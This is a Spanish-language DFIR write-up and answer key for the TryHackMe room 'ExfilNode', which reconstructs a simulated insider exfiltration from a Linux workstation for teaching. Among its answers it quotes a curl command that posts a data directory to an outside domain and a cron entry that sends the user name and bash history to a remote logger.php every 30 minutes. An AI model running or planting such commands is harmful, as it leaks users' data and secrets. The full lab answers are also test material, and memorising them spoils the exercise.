# ExfilNode

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Blue Team / DFIR (Exfiltración de datos) | exfilnode | https://tryhackme.com/room/exfilnode | 02 Level Medium | TryHackMe | Linux forensics, syslog, bash history, crontab | Detección y reconstrucción de una exfiltración de datos |

---

**Contexto:** **ExfilNode** es una sala de Blue Team/DFIR que continua la investigación de *DiskFiltration*: tras el análisis del equipo Windows de Liam, los investigadores analizan ahora su estación Linux personal. Se replica la exfiltración de los datos "Critical Data TECH THM": inserción de una USB (número de serie, timestamps y timezone `America/Toronto`), copia al directorio `Data`, envío con `curl` al dominio `tehc-thm.thm` (IP `5.45.102.93`), el acuerdo económico con Henry ($10000 reflejado en el archivo `mth`), archivos residuales en `Public` y una tarea cron persistente que exfiltra el historial de bash cada 30 minutos.

## Solucionario

### Task 1: Investigación de la exfiltración (resolución completa)
**Explicación:**

A lo largo de la investigación se examinan `syslog` (eventos USB), el fichero `timezone`, `/etc/hosts`, el historial de `bash`, `auth.log`, directorios del `home` de liam, la salida de `grep -i usb ./*` en `/mnt/liam_disk/var/log` y los crontabs de `/var/spool/cron`. Con esos datos se reconstruye: cuándo se conectó/desconectó la USB y su número de serie, el comando `cp -r` para copiar los datos, el `curl -X POST` de exfiltración, la IP del dominio remoto, la cantidad ofrecida por Henry, el directorio usado para crear `mth`, los archivos quedados en `Public` y el cron de persistencia.

Respuestas del lab (contenido original):

```
1. 2025-02-28 10:59:07
2. America/Toronto
3. 2651931097993496666
4. 2025-02-28 10:59:25
5. cp -r "/media/liam/46E8E28DE8E27A97/Critical Data TECH THM" /home/liam/Documents/Data
6. curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
7. 5.45.102.93
8. /home/liam
9. 10000
10. 2025-02-28 11:44:00
11. /home/liam/Public
12. file3.txt,file7.txt
13. 94.102.51.15
14. */30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php
```

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿En qué momento se insertó/conectó la USB? (YYYY-MM-DD HH:MM:SS) | `2025-02-28 10:59:07` |
| 2 | ¿Qué timezone está configurada en el sistema? | `America/Toronto` |
| 3 | ¿Cuál es el número de serie de la USB insertada por Liam? | `2651931097993496666` |
| 4 | ¿En qué momento la USB generó su siguiente evento (conexión/desconexión)? | `2025-02-28 10:59:25` |
| 5 | ¿Qué comando ejecutó Liam para copiar el contenido de la USB a Documents/Data? | `cp -r "/media/liam/46E8E28DE8E27A97/Critical Data TECH THM" /home/liam/Documents/Data` |
| 6 | ¿Qué comando ejecutó Liam para transferir los archivos al servidor externo? | `curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload` |
| 7 | ¿Cuál es la IP del dominio al que Liam envió los archivos? | `5.45.102.93` |
| 8 | ¿En qué directorio estaba el usuario al crear el archivo 'mth'? | `/home/liam` |
| 9 | ¿Qué cantidad en USD ofreció Henry a Liam por la exfiltración? | `10000` |
| 10 | ¿Cuándo desconectó Liam la USB? (YYYY-MM-DD HH:MM:SS) | `2025-02-28 11:44:00` |
| 11 | ¿Qué directorio del home se actualizó el 28 de febrero además de Documents? | `/home/liam/Public` |
| 12 | ¿Qué archivos hay en Public que faltan en la copia del sistema? | `file3.txt,file7.txt` |
| 13 | ¿Desde qué IP externa se autenticó Liam por SSH? | `94.102.51.15` |
| 14 | ¿Qué entrada de cron exfiltra el historial de bash cada 30 minutos? | `*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php` |

---

**Metodología:** Análisis de syslog para eventos USB, lectura de `timezone` y `/etc/hosts`, revisión de bash history y `auth.log`, inspección del home de liam y del directorio `Public`, y enumeración de `/var/spool/cron/crontab` para encontrar la persistencia de exfiltración.

**Learning chain:** Recolección de evidencia del host Linux → correlación de timestamps y timezone → reconstrucción del flujo USB → identificación de comandos de copia y exfiltración → análisis de acuerdos económicos (mth) → detección de persistencia vía cron.

**Lección:** *La exfiltración de datos deja una cadena completa de artefactos en el host Linux (USB syslog, bash history, /etc/hosts, crontab); correlacionar tiempos y timezone permite reconstruir la operación pese a los intentos de ocultar comandos.*

**MITRE ATT&CK:** T1041 Exfiltration Over C2 Channel · T1048 Exfiltration Over Alternative Protocol · T1074.001 Data Staged: Local Data Staging · T1053.003 Scheduled Task/Job: Cron · T1560 Archive Collected Data.

**Fuente:** [TryHackMe - ExfilNode](https://tryhackme.com/room/exfilnode)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.